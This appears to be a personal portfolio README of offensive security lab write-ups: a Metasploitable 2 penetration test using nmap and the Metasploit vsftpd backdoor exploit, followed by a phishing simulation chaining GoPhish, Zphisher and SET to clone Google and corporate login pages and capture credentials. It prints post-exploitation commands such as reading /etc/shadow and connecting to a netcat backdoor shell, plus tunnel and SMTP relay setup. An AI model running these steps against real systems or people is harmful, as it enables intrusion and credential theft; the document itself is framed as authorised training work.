> 🧰Offensive security lab write-ups  
 
All labs conducted in isolated VirtualBox environments or on authorised external targets.
No unauthorised systems were accessed. All work complies with Swiss law and ethical hacking standards.

---

## 📁 Labs

### Network Penetration Testing Lab
Performed a full penetration test lifecycle: reconnaissance, scanning, vulnerability identification, exploitation, and post-exploitation. Documented findings in a structured report format.
<br>**Tools:** nmap · Metasploit · Hydra
<br>Target: Metasploitable 2 (192.168.56.XXX)
- ✅ Network scanning with nmap (SYN, version, OS detection)
- ✅ Service enumeration and vulnerability mapping
- ✅ Exploitation via Metasploit Framework
- ✅ Brute force attacks with Hydra

**Commands:**

**Phase 1 — Reconnaissance**
```bash
sudo netdiscover -r $HOST/24 -i eth0
sudo nmap $HOST                          # basic scan
sudo nmap -T5 -sV $HOST                  # version detection
sudo nmap --script=vuln -p 21 $HOST      # vulnerability confirmation
```

**Phase 2 — Exploitation**
```bash
msfconsole
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS $HOST
msf6 > run
```

**Phase 3 — Post-Exploitation**
```bash
whoami
hostname
pwd
ls /
cat /etc/shadow
nc $HOST 1524                            # secondary backdoor
```
                       
**nmap version scan — identifying vsftpd 2.3.4**
<br><img width="610" height="165" alt="image" src="https://github.com/user-attachments/assets/d3ff4093-4ccb-429f-9ce7-41f16b4d0dc2" />

**vulnerability Confirmation**
<br><img width="418" height="134" alt="image" src="https://github.com/user-attachments/assets/964b4ae0-2f73-4d9a-a06e-9bbf77c113fc" />

**metasploit — root shell obtained**
<br><img width="550" height="165" alt="image" src="https://github.com/user-attachments/assets/5338c658-d205-43ff-83bb-1a3d9842fba4" />
<br><img width="611" height="222" alt="image" src="https://github.com/user-attachments/assets/5a2bb5d0-0543-47ba-8c73-fb09a3521b5d" />

> 📄 **[Download Full Lab Report (PDF)](https://github.com/jaalso/cybersecurity-portfolio/raw/main/Pentest_Lab_Writeup_protected.pdf)**
<br>🔒 Password protected — contact me via [LinkedIn](https://linkedin.com/in/jaalso) to request access

---

### GoPhish Phishing Simulation & Offensive Email Attack Chain
Complete offensive email attack chain across 6 phases — from infrastructure setup through
credential capture and campaign tracking. Mirrors the functionality of commercial platforms
like KnowBe4, Hoxhunt, and Riot at zero cost.
<br>**Tools:** GoPhish · Zphisher · SET · swaks · Ngrok · Cloudflared · CyberChef · Postfix

Phase 1 — Infrastructure Setup
- ✅ GoPhish v0.12.1 deployed on Kali Linux — admin panel at https://127.X.X.X:3XXX
- ✅ Gmail SMTP configured as authenticated relay with App Password
- ✅ Ngrok + Cloudflared + LocalXpose tested as tunnel options — no paid domain required
- ✅ DNS persistence fix — /etc/resolv.conf locked with chattr +i to survive sudo sessions
- ✅ SMTP delivery verified with swaks independently before GoPhish configuration

 **GoPhish setup**
```bash
chmod +x gophish
sudo ./gophish                           # launch admin panel at https://127.X.X.X:3XXX

# DNS persistence fix — survives sudo and reboots
echo "nameserver X.X.X.X" | sudo tee /etc/resolv.conf
sudo chattr +i /etc/resolv.conf          # lock file from being overwritten

# Verify DNS resolution
ping smtp.xxxx.com -c 3
```

Phase 2 — Credential Harvesting Pages
- ✅ Zphisher — pixel-perfect Google login clone, credentials captured to auth/usernames.dat
- ✅ SET (Social Engineering Toolkit) — cloned Schroders eServices corporate login portal; visually identical to real page
- ✅ Three tunnel services tested: Cloudflared (no account) · Ngrok · LocalXpose

```bash
swaks --to $RECIPIENTEMAIL$ \
      --from $SENDEREMAIL$ \
      --server smtp.£HOSTEMAIL.com:$PORT \
      --auth LOGIN \
      --auth-user $SENDEREMAIL$ \
      --auth-password [APP_PASSWORD] \
      --tls
# Expected: 235 2.7.0 Accepted — authentication successful
# Expected: 250 2.0.0 OK — email accepted for delivery
```

Phase 3 — Email Delivery
- ✅ Postfix direct relay failed — Outlook rejected port 25 from unknown IP (Layer 1 IP reputation gateway confirmed)
- ✅ Gmail SMTP relay succeeded — authenticated relay bypasses reputation checks
- ✅ swaks verified SMTP authentication independently (235 2.7.0 Accepted)

```bash
git clone https://github.com/htr-tech/zphisher.git
cd zphisher
chmod +x zphisher.sh
bash zphisher.sh                       
# Victim IP saved to:   auth/ip.txt
```

Phase 4 — Email Template Crafting
- ✅ Version 1 — custom Google security alert HTML with {{.FirstName}} and {{.URL}} variables
- ✅ Version 2 — real Google security alert cloned using forensic skills in reverse:

Exported .eml from Outlook
Decoded quoted-printable encoding with CyberChef 
<br><img width="677" height="925" alt="image" src="https://github.com/user-attachments/assets/9cbcbb6e-111e-498f-99b0-a4a452a16e9d" />

Phase 5 — GoPhish Campaign Results
<br><img width="867" height="939" alt="image" src="https://github.com/user-attachments/assets/c6c98bc5-364c-4864-97fa-38bad07c9ddd" />
<br><img width="862" height="549" alt="image" src="https://github.com/user-attachments/assets/45dcf5f6-cdb7-4291-8dc1-beb906bac0ae" />
```bash
sudo setoolkit

# Post-back IP: 127.x.x.x
# URL to clone: https://victimurl

# Expose via Ngrok
ngrok http $PROTOCOL
```
| Metric | Result | Notes |
|---|---|---|
| Email Sent | ✅ 1 | Delivered via Gmail SMTP |
| Email Opened | ✅ 1 | Tracking pixel loaded by Outlook |
| Clicked Link | ✅ 1 | Victim clicked "Verify My Account" |
| Submitted Data | ⚪ 0 | Redirect configured |
| Email Reported | ⚪ 0 | Victim did not report as phishing |
| Delivery location | ⚠️ Junk | Low sender reputation |

Phase 6 — Combined Attack Chain (GoPhish + Zphisher)
<br><img width="443" height="299" alt="image" src="https://github.com/user-attachments/assets/bd3254ac-4daf-45d5-a0c7-6e077d93b8af" />
| Step | Component | Action | Result |
|---|---|---|---|
| 1 | GoPhish | Sends phishing email via Gmail SMTP | Email delivered to target |
| 2 | Victim | Opens email | GoPhish records ✅ Email Opened |
| 3 | Victim | Clicks "Check Activity" button | GoPhish records ✅ Clicked Link |
| 4 | GoPhish | Redirects via tracking link to Zphisher URL | Request reaches Zphisher server |
| 5 | Zphisher | Serves pixel-perfect Google login clone | Victim sees convincing fake page |
| 6 | Victim | Enters email and password | Zphisher captures credentials |
| 7 | Zphisher | Saves to auth/usernames.dat + auth/ip.txt | Attacker has credentials + victim IP |
| 8 | Zphisher | Redirects victim to real accounts.google.com | Victim thinks login failed, tries again |

Authentication Analysis
| Check | Result | Why It Passed | What It Missed |
|---|---|---|---|
| SPF | ✅ PASS | Gmail authorised to send for gmail.com | Cannot check message intent or content |
| DKIM | ✅ PASS | Email signed by Gmail's valid DKIM key | Signing domain ≠ legitimate purpose |
| DMARC | ✅ PASS | From domain aligns with DKIM signing domain | p=none on Gmail means no enforcement |
| Outlook delivery | ⚠️ Junk | Low sender reputation score | Still delivered — just to Junk |
| MFA | 🛡️ Would block | Requires second factor | Only control that fully stops attack |

MITRE ATT&CK Mapping
| Technique | ID | Tool Used | Description |
|---|---|---|---|
| Phishing | T1566 | GoPhish + Zphisher | Primary attack vector |
| Spearphishing Link | T1566.002 | GoPhish campaign | Email with tracked phishing URL |
| Acquire Infrastructure | T1583 | Ngrok · Cloudflared · LocalXpose | Tunnel services as attack infrastructure |
| Compromise Infrastructure | T1584 | Gmail account | Legitimate service abused for SMTP relay |
| Masquerading | T1036 | Google email clone · URL masking | Impersonating legitimate Google alerts |
| Credentials from Web Browsers | T1555.003 | Zphisher | Harvesting submitted login credentials |
| Valid Accounts | T1078 | Captured credentials | Would enable account access post-capture |

This lab successfully demonstrated the complete offensive email attack chain from infrastructure
setup through credential capture and campaign tracking. Six distinct phases were executed,
covering three phishing page tools, four tunnel services, two SMTP delivery methods, two email
template approaches, and one full integrated campaign combining GoPhish and Zphisher

> 📄 **[Download Full Lab Report (PDF)](https://github.com/jaalso/cybersecurity-portfolio/raw/main/offensive_email_chain_report_protected.pdf)**
<br>🔒 Password protected — contact me via [LinkedIn](https://linkedin.com/in/jaalso) to request access

---

## 🧰 Tools Used

| Category | Tools |
|---|---|
| Scanning & Recon | nmap · netdiscover · Wireshark · TShark |
| Exploitation | Metasploit · Hydra · CrackMapExec |
| Phishing Simulation | GoPhish · Zphisher · SET |
| Email Testing | swaks · CyberChef · emlAnalyzer |
| Tunneling | Ngrok · Cloudflared · LocalXpose |
| Post-Exploitation | Metasploit shell · netcat |
| Platform | Kali Linux · Metasploitable 2 · VirtualBox |

---

## ⚖️ Legal & Ethical Notice

All offensive security activities were conducted exclusively in:
- Isolated VirtualBox lab environments (no external connectivity)
- Authorised external targets (vuln.land)
- Training platforms (TryHackMe, HackTheBox)

No unauthorised systems were accessed. All work complies with Swiss law.
